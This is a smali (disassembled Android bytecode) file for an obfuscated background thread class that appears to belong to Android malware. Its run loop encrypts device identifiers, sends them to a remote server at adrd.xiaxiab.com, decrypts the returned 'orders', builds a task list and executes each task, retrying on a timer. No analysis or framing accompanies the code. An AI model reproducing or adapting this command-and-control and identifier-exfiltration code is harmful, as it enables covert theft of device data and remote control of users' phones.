.class Lcom/xxx/yyy/adad$1;
.super Ljava/lang/Thread;
.source "adad.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/xxx/yyy/adad;->StartGo()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/xxx/yyy/adad;


# direct methods
.method constructor <init>(Lcom/xxx/yyy/adad;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    .line 54
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 22

    .prologue
    .line 58
    const-string v17, ""

    .line 61
    .local v17, "im":Ljava/lang/String;
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v3, v0

    invoke-static {v3}, Lcom/xxx/yyy/adad;->access$0(Lcom/xxx/yyy/adad;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "&"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v3, v0

    invoke-static {v3}, Lcom/xxx/yyy/adad;->access$1(Lcom/xxx/yyy/adad;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v3, v0

    invoke-static {v3}, Lcom/xxx/yyy/adad;->access$2(Lcom/xxx/yyy/adad;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/xxx/yyy/ddda;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    move-result-object v17

    .line 69
    :cond_0
    :goto_0
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    invoke-static {v2}, Lcom/xxx/yyy/adad;->access$3(Lcom/xxx/yyy/adad;)I

    move-result v2

    if-gtz v2, :cond_1

    .line 143
    :goto_1
    return-void

    .line 70
    :cond_1
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    invoke-static {v2}, Lcom/xxx/yyy/adad;->access$3(Lcom/xxx/yyy/adad;)I

    move-result v2

    sget v3, Lcom/xxx/yyy/adad;->Max_Try_Count:I

    if-eq v2, v3, :cond_2

    .line 74
    const-wide/32 v2, 0x927c0

    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 79
    :cond_2
    :goto_2
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    invoke-static {v2}, Lcom/xxx/yyy/adad;->access$3(Lcom/xxx/yyy/adad;)I

    move-result v3

    const/4 v4, 0x1

    sub-int/2addr v3, v4

    invoke-static {v2, v3}, Lcom/xxx/yyy/adad;->access$4(Lcom/xxx/yyy/adad;I)V

    .line 80
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    const/4 v3, 0x0

    invoke-static {v2, v3}, Lcom/xxx/yyy/adad;->access$5(Lcom/xxx/yyy/adad;I)V

    .line 81
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "http://adrd.xiaxiab.com/pic.aspx?im="

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 82
    move-object v0, v3

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 81
    invoke-static {v2, v3}, Lcom/xxx/yyy/adad;->access$6(Lcom/xxx/yyy/adad;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 91
    .local v18, "order":Ljava/lang/String;
    :try_start_2
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    invoke-static {v2}, Lcom/xxx/yyy/adad;->access$2(Lcom/xxx/yyy/adad;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, v18

    move-object v1, v2

    invoke-static {v0, v1}, Lcom/xxx/yyy/ddda;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    move-result-object v18

    .line 99
    :goto_3
    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_0

    const/4 v2, 0x1

    move-object/from16 v0, v18

    move v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const/16 v3, 0x23

    if-ne v2, v3, :cond_0

    .line 101
    new-instance v21, Ljava/util/ArrayList;

    invoke-direct/range {v21 .. v21}, Ljava/util/ArrayList;-><init>()V

    .line 102
    .local v21, "tasklist":Ljava/util/List;, "Ljava/util/List<Lcom/xxx/yyy/BBBB;>;"
    const-string v2, "\\$"

    move-object/from16 v0, v18

    move-object v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v19

    .line 103
    .local v19, "orders":[Ljava/lang/String;
    const/16 v16, 0x0

    .local v16, "i":I
    :goto_4
    move-object/from16 v0, v19

    array-length v0, v0

    move v2, v0

    move/from16 v0, v16

    move v1, v2

    if-lt v0, v1, :cond_3

    .line 119
    const/16 v16, 0x0

    :goto_5
    invoke-interface/range {v21 .. v21}, Ljava/util/List;->size()I

    move-result v2

    move/from16 v0, v16

    move v1, v2

    if-lt v0, v1, :cond_5

    .line 139
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    invoke-static {v2}, Lcom/xxx/yyy/adad;->access$9(Lcom/xxx/yyy/adad;)I

    move-result v2

    sget v3, Lcom/xxx/yyy/adad;->Min_Error_Count:I

    if-ge v2, v3, :cond_0

    goto/16 :goto_1

    .line 104
    :cond_3
    aget-object v2, v19, v16

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x1

    if-le v2, v3, :cond_4

    .line 107
    aget-object v2, v19, v16

    const-string v3, "\\|"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v20

    .line 108
    .local v20, "subOrders":[Ljava/lang/String;
    const/4 v2, 0x0

    aget-object v14, v20, v2

    .line 110
    .local v14, "head":Ljava/lang/String;
    const-string v2, "#"

    invoke-virtual {v14, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v15

    .line 112
    .local v15, "heads":[Ljava/lang/String;
    new-instance v2, Lcom/xxx/yyy/BBBB;

    .line 113
    const/4 v3, 0x1

    aget-object v3, v15, v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    const/4 v4, 0x2

    aget-object v4, v15, v4

    .line 114
    const/4 v5, 0x1

    aget-object v5, v20, v5

    const/4 v6, 0x2

    aget-object v6, v20, v6

    .line 115
    const/4 v7, 0x3

    aget-object v7, v20, v7

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v8, v0

    invoke-static {v8}, Lcom/xxx/yyy/adad;->access$1(Lcom/xxx/yyy/adad;)Ljava/lang/String;

    move-result-object v8

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v9, v0

    invoke-static {v9}, Lcom/xxx/yyy/adad;->access$7(Lcom/xxx/yyy/adad;)I

    move-result v9

    .line 116
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v10, v0

    invoke-static {v10}, Lcom/xxx/yyy/adad;->access$8(Lcom/xxx/yyy/adad;)Landroid/content/Context;

    move-result-object v10

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v11, v0

    invoke-static {v11}, Lcom/xxx/yyy/adad;->access$2(Lcom/xxx/yyy/adad;)Ljava/lang/String;

    move-result-object v11

    .line 112
    invoke-direct/range {v2 .. v11}, Lcom/xxx/yyy/BBBB;-><init>(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILandroid/content/Context;Ljava/lang/String;)V

    move-object/from16 v0, v21

    move-object v1, v2

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 103
    .end local v14    # "head":Ljava/lang/String;
    .end local v15    # "heads":[Ljava/lang/String;
    .end local v20    # "subOrders":[Ljava/lang/String;
    :cond_4
    add-int/lit8 v16, v16, 0x1

    goto/16 :goto_4

    .line 121
    :cond_5
    :try_start_3
    move-object/from16 v0, v21

    move/from16 v1, v16

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Lcom/xxx/yyy/BBBB;

    .line 122
    .local v12, "b":Lcom/xxx/yyy/BBBB;
    invoke-virtual {v12}, Lcom/xxx/yyy/BBBB;->Go()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 134
    .end local v12    # "b":Lcom/xxx/yyy/BBBB;
    :goto_6
    const-wide/16 v2, 0x3e8

    :try_start_4
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_2

    .line 119
    :goto_7
    add-int/lit8 v16, v16, 0x1

    goto/16 :goto_5

    .line 123
    :catch_0
    move-exception v2

    move-object v13, v2

    .line 124
    .local v13, "e":Ljava/lang/Exception;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/adad$1;->this$0:Lcom/xxx/yyy/adad;

    move-object v2, v0

    invoke-static {v2}, Lcom/xxx/yyy/adad;->access$9(Lcom/xxx/yyy/adad;)I

    move-result v3

    add-int/lit8 v3, v3, 0x1

    invoke-static {v2, v3}, Lcom/xxx/yyy/adad;->access$5(Lcom/xxx/yyy/adad;I)V

    goto :goto_6

    .line 75
    .end local v13    # "e":Ljava/lang/Exception;
    .end local v16    # "i":I
    .end local v18    # "order":Ljava/lang/String;
    .end local v19    # "orders":[Ljava/lang/String;
    .end local v21    # "tasklist":Ljava/util/List;, "Ljava/util/List<Lcom/xxx/yyy/BBBB;>;"
    :catch_1
    move-exception v2

    goto/16 :goto_2

    .line 135
    .restart local v16    # "i":I
    .restart local v18    # "order":Ljava/lang/String;
    .restart local v19    # "orders":[Ljava/lang/String;
    .restart local v21    # "tasklist":Ljava/util/List;, "Ljava/util/List<Lcom/xxx/yyy/BBBB;>;"
    :catch_2
    move-exception v2

    goto :goto_7

    .line 94
    .end local v16    # "i":I
    .end local v19    # "orders":[Ljava/lang/String;
    .end local v21    # "tasklist":Ljava/util/List;, "Ljava/util/List<Lcom/xxx/yyy/BBBB;>;"
    :catch_3
    move-exception v2

    goto/16 :goto_3

    .line 64
    .end local v18    # "order":Ljava/lang/String;
    :catch_4
    move-exception v2

    goto/16 :goto_0
.end method
